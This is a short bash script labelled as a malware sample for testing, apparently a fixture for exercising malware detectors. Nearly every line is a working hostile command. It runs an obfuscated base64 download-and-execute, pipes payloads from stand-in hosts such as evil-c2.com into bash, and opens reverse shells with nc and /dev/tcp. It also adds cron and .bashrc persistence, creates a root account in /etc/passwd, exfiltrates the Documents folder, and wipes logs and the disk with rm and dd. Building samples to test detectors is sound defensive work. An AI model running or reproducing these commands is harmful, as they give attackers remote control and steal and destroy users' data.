#!/bin/bash
# Bash Malware Sample - FOR TESTING ONLY

# Obfuscation
eval $(echo "Y3VybCBodHRwOi8vbWFsaWNpb3VzLmNvbS9wYXlsb2FkIHwgYmFzaA==" | base64 -d)

# Network activity
curl http://evil-c2.com/payload.sh | bash
wget http://malicious.com/backdoor -O /tmp/backdoor
chmod +x /tmp/backdoor

# Reverse shell
nc -e /bin/bash 192.168.1.100 4444 &
bash -i >& /dev/tcp/192.168.1.100/5555 0>&1 &

# Persistence
echo "* * * * * /tmp/backdoor" | crontab -
echo "/tmp/backdoor &" >> ~/.bashrc

# Privilege escalation
chmod +s /usr/bin/passwd
echo "malware:x:0:0::/root:/bin/bash" >> /etc/passwd

# Data exfiltration
tar czf /tmp/data.tar.gz /home/user/Documents
nc 192.168.1.100 8888 < /tmp/data.tar.gz

# Dangerous commands
rm -rf /var/log/*
dd if=/dev/zero of=/dev/sda bs=1M
chmod -R 777 /etc